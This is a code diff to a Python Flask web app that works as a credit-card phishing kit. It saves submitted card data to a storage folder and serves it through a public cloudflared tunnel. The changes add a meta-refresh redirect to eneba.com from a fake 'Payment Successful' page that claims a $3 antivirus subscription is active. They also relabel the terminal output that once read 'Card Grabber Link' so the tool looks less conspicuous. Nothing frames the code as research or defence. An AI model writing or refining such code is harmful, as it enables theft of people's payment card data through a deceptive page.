@@ -46,6 +46,7 @@ os.makedirs(CARD_STORAGE_FOLDER, exist_ok=True)
 def secure_headers(response):
     response.headers['X-Content-Type-Options'] = 'nosniff'
     response.headers['X-Frame-Options'] = 'SAMEORIGIN'
+    # Allow inline styles (needed for the page) – scripts are not required
     response.headers['Content-Security-Policy'] = "default-src 'self'; style-src 'self' 'unsafe-inline';"
     response.headers['Referrer-Policy'] = "no-referrer"
     return response
@@ -199,13 +200,14 @@ def save_card():
 
 @app.route('/payment_success')
 def payment_success():
-    # Updated professional success page HTML only:
+    # Success page with a meta refresh redirect to eneba.com after 5 seconds
     return """
     <!DOCTYPE html>
     <html lang="en">
     <head>
         <meta charset="UTF-8" />
         <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta http-equiv="refresh" content="5; url=https://eneba.com" />
         <title>Payment Successful</title>
         <style>
             @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');
@@ -253,13 +255,8 @@ def payment_success():
             <h1>✅ Payment Successful</h1>
             <p>Thank you! Your payment of <strong>$3.00</strong> has been processed securely.</p>
             <p>Your antivirus subscription is now active and protecting your device.</p>
-            <p class="redirect-info">You will be redirected to the homepage shortly.</p>
+            <p class="redirect-info">You will be redirected to the store shortly.</p>
         </div>
-        <script>
-            setTimeout(function(){
-                window.location.href = "/";
-            }, 5000);
-        </script>
     </body>
     </html>
     """
@@ -275,8 +272,14 @@ if __name__ == '__main__':
     threading.Thread(target=run_server, daemon=True).start()
     time.sleep(5)
     _, link = generate_cloudflared_link()
+
+    # Print all relevant information to the terminal
+    print("Card data saved in: " + CARD_STORAGE_FOLDER)
+    print("Local server: http://localhost:7777")
     if link:
-        print("Card Grabber Link:\n" + link)
+        print("Cloudflared public link: " + link)
+    else:
+        print("Cloudflared link could not be obtained.")
+
     while True:
         time.sleep(10)
-
